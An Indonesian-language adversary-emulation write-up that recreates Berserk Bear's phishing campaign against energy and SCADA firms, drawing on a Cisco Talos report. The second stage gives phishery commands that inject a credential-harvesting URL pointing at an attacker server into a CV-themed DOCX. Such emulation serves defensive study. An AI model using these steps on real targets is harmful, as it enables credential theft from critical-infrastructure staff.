# Simulasi Serangan Berserk Bear APT

Ini adalah simulasi serangan oleh grup APT (Berserk Bear) yang menargetkan infrastruktur kritis dan perusahaan energi di seluruh dunia, terutama di Eropa dan Amerika Serikat. Kampanye serangan ini aktif setidaknya sejak Mei 2017. Serangan ini menargetkan penyedia infrastruktur kritis dan vendor yang mereka gunakan untuk menyediakan layanan penting. Rantai serangan dimulai dengan **kontainer XML berbahaya** yang disuntikkan ke dalam file DOCX, yang terhubung ke server eksternal melalui (SMB) dan digunakan untuk diam-diam mengambil kredensial pengguna, lalu digunakan dalam serangan spear-phishing. Saya mengandalkan laporan dari [Cisco Talos Intelligence Group](https://blog.talosintelligence.com/template-injection/) untuk memahami detailnya dan membuat simulasi ini.

![imageedit_2_8052388982](https://github.com/S3N4T0R-0X0/Berserk-Bear-APT/assets/121706460/3d592743-ea32-4f8e-9739-1d0696c1bfd2)

Jika Anda ingin mengetahui lebih lanjut tentang serangan oleh grup APT Berserk Bear, lihat di sini: [ETDA Berserk Bear Card](https://apt.etda.or.th/cgi-bin/showcard.cgi?g=Berserk%20Bear%2C%20Dragonfly%202%2E0&n=1)

Serangan ini meliputi beberapa tahap, termasuk penyuntikan file DOCX dan penggunaan kontainer XML berbahaya yang memicu notifikasi untuk memperoleh kredensial yang kemudian ditransfer ke server penyerang. Kredensial ini digunakan oleh penyerang untuk mengakses data organisasi yang menjadi target serangan spear-phishing. File DOCX berupa CV ini dibuat untuk orang dengan pengalaman sepuluh tahun dalam pengembangan perangkat lunak dan sistem kontrol SCADA.

1. Buat file DOCX CV yang akan disuntikkan dan dikirim melalui spear phishing.

2. Lakukan penyuntikan pada file DOCX untuk memperoleh kredensial menggunakan alat phishery.

3. Phishing Kredensial terjadi ketika target membuka file Word dan memasukkan kredensial dalam notifikasi yang akan ditampilkan.


## Tahap Pertama (teknik pengiriman)

Penyerang menargetkan institusi yang terkait dengan energi dan sistem manajemen energi seperti SCADA. Mereka membuat file DOCX dalam bentuk CV untuk melamar pekerjaan, tampaknya ada lowongan pekerjaan terbuka untuk posisi tersebut. Penyerang mengirimkan CV yang berisi kontainer XML berbahaya. Di sini, saya membuat CV identik dengan yang digunakan dalam serangan asli.

![Screenshot from 2024-05-18 19-21-05](https://github.com/S3N4T0R-0X0/Berserk-Bear-APT/assets/121706460/b0e13bdf-1816-41a9-99d8-4fc31d751aeb)


## Tahap Kedua (teknik implantasi)

Menurut Cisco Talos Intelligence Group, penyerang menyuntikkan file DOCX melalui alat phishery. Pada saat serangan ini, phishery merupakan alat baru, dan para penyerang memanfaatkan momen tersebut. Mungkin mereka juga melakukan beberapa modifikasi sebelum menggunakannya dalam serangan ini.

![Screenshot from 2024-05-21 08-11-09](https://github.com/S3N4T0R-0X0/Berserk-Bear-APT/assets/121706460/b0bcf631-779b-44d4-899b-b37646a0427f)

Phishery adalah server HTTP yang sederhana dengan SSL, dirancang untuk tujuan utama phishing kredensial melalui Otentikasi Dasar. Phishery juga memungkinkan penyuntikan URL ke dalam dokumen Word (.docx) dengan mudah.

Repository Github: https://github.com/ryhanson/phishery.git

![photo_2024-05-28_08-22-20](https://github.com/S3N4T0R-0X0/Berserk-Bear-APT/assets/121706460/847f8fea-3076-49bb-9703-0375f24e085b)

Berikut adalah perintah untuk menginstal dan menggunakan phishery:
`sudo apt-get install phishery`

`phishery -u https://192.168.138.138 -i CV.docx -o malicious.docx`

`phishery`

Sekarang, CV berbahaya akan dikirim ke target dan menunggu kredensial.

## Tahap Ketiga (teknik eksekusi)

Phishing Kredensial terjadi ketika target membuka file Word yang berbahaya dan memasukkan kredensial dalam notifikasi yang akan ditampilkan kepada mereka.

https://github.com/S3N4T0R-0X0/Berserk-Bear-APT/assets/121706460/ac654ad4-45d8-4bea-a0cb-a3a0fc7e567d
